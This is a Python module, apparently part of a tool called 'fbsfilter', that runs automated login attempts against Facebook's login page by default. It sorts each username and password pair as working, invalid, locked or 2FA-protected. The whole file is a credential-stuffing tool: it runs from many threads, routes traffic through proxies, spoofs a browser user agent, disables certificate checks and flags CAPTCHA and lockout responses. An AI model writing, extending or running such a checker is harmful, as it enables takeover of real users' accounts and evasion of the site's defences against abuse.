"""Credential checker for fbsfilter.

Performs HTTP login attempts and classifies results as:
  working  – credentials accepted
  invalid  – credentials rejected
  locked   – account/IP temporarily blocked or CAPTCHA encountered
  2fa      – valid credentials but 2-factor authentication is required

The checker is designed to be run from multiple threads simultaneously.
"""

import json
import logging
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, Optional, Tuple

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger("fbsfilter.checker")


class Status(str, Enum):
    WORKING = "working"
    INVALID = "invalid"
    LOCKED = "locked"
    TWOFA = "2fa"
    ERROR = "error"


@dataclass
class CheckResult:
    username: str
    password: str
    status: Status
    detail: str = ""
    response_url: str = ""


@dataclass
class TargetConfig:
    url: str = "https://www.facebook.com/login.php"
    username_field: str = "email"
    password_field: str = "pass"
    extra_fields: Dict[str, str] = field(default_factory=dict)
    method: str = "POST"
    success_redirect_contains: str = "facebook.com"
    failure_keyword: str = "incorrect password"
    success_status: Optional[int] = None


# Keywords that indicate a CAPTCHA / rate-limit / lockout response
_LOCK_KEYWORDS = [
    "captcha",
    "security check",
    "unusual activity",
    "temporarily blocked",
    "too many",
    "rate limit",
    "checkpoint",
    "suspicious activity",
]

# Keywords that indicate 2-factor authentication is required
_TWOFA_KEYWORDS = [
    "two-factor",
    "two factor",
    "2-factor",
    "2fa",
    "authentication code",
    "verification code",
    "enter the code",
    "enter code",
    "confirm your identity",
]


class CredentialChecker:
    """Performs a single login attempt and returns a :class:`CheckResult`."""

    _DEFAULT_HEADERS = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/122.0.0.0 Safari/537.36"
        ),
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
    }

    def __init__(
        self,
        target: TargetConfig,
        timeout: int = 10,
        retries: int = 2,
        delay: float = 0.5,
        proxies: Optional[Dict[str, str]] = None,
    ):
        self.target = target
        self.timeout = timeout
        self.retries = retries
        self.delay = delay
        self.proxies = proxies

        self._session = requests.Session()
        self._session.headers.update(self._DEFAULT_HEADERS)

    def check(self, username: str, password: str) -> CheckResult:
        """Attempt login and return a :class:`CheckResult`."""
        for attempt in range(1, self.retries + 2):
            try:
                result = self._attempt(username, password)
                if result.status != Status.ERROR:
                    return result
            except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError) as exc:
                logger.debug("Attempt %d failed for %s: %s", attempt, username, exc)
                if attempt > self.retries:
                    return CheckResult(
                        username=username,
                        password=password,
                        status=Status.ERROR,
                        detail=str(exc),
                    )
            except requests.exceptions.Timeout:
                logger.debug("Timeout on attempt %d for %s", attempt, username)
                if attempt > self.retries:
                    return CheckResult(
                        username=username,
                        password=password,
                        status=Status.ERROR,
                        detail="timeout",
                    )
            except requests.exceptions.RequestException as exc:
                logger.debug("Request error on attempt %d for %s: %s", attempt, username, exc)
                if attempt > self.retries:
                    return CheckResult(
                        username=username,
                        password=password,
                        status=Status.ERROR,
                        detail=str(exc),
                    )
            if self.delay > 0:
                time.sleep(self.delay)

        return CheckResult(username=username, password=password, status=Status.ERROR)

    def _attempt(self, username: str, password: str) -> CheckResult:
        data = {
            self.target.username_field: username,
            self.target.password_field: password,
        }
        data.update(self.target.extra_fields)

        kwargs = dict(
            url=self.target.url,
            data=data,
            timeout=self.timeout,
            proxies=self.proxies,
            verify=False,
            allow_redirects=True,
        )

        if self.target.method.upper() == "GET":
            resp = self._session.get(params=data, **{k: v for k, v in kwargs.items() if k != "data"})
        else:
            resp = self._session.post(**kwargs)

        final_url = resp.url.lower()
        body = resp.text.lower()

        return self._classify(username, password, resp.status_code, final_url, body)

    def _classify(
        self,
        username: str,
        password: str,
        status_code: int,
        final_url: str,
        body: str,
    ) -> CheckResult:

        # Locked / CAPTCHA check (highest priority)
        for kw in _LOCK_KEYWORDS:
            if kw in body or kw in final_url:
                return CheckResult(
                    username=username,
                    password=password,
                    status=Status.LOCKED,
                    detail="captcha/lock detected",
                    response_url=final_url,
                )

        # 2FA check
        for kw in _TWOFA_KEYWORDS:
            if kw in body or kw in final_url:
                return CheckResult(
                    username=username,
                    password=password,
                    status=Status.TWOFA,
                    detail="2FA required",
                    response_url=final_url,
                )

        # Specific status code check
        if self.target.success_status and status_code != self.target.success_status:
            return CheckResult(
                username=username,
                password=password,
                status=Status.INVALID,
                detail=f"status {status_code}",
                response_url=final_url,
            )

        # Failure keyword check
        if self.target.failure_keyword and self.target.failure_keyword.lower() in body:
            return CheckResult(
                username=username,
                password=password,
                status=Status.INVALID,
                detail="failure keyword matched",
                response_url=final_url,
            )

        # Success URL check
        if self.target.success_redirect_contains:
            if self.target.success_redirect_contains.lower() in final_url and \
               "login" not in final_url and \
               "checkpoint" not in final_url:
                return CheckResult(
                    username=username,
                    password=password,
                    status=Status.WORKING,
                    detail="redirect matched",
                    response_url=final_url,
                )

        # Fallback – treat as invalid if we ended up back at the login page
        if "login" in final_url or "signin" in final_url:
            return CheckResult(
                username=username,
                password=password,
                status=Status.INVALID,
                detail="redirected back to login",
                response_url=final_url,
            )

        # Default: mark as invalid to avoid false positives
        return CheckResult(
            username=username,
            password=password,
            status=Status.INVALID,
            detail=f"unrecognised response (status={status_code})",
            response_url=final_url,
        )
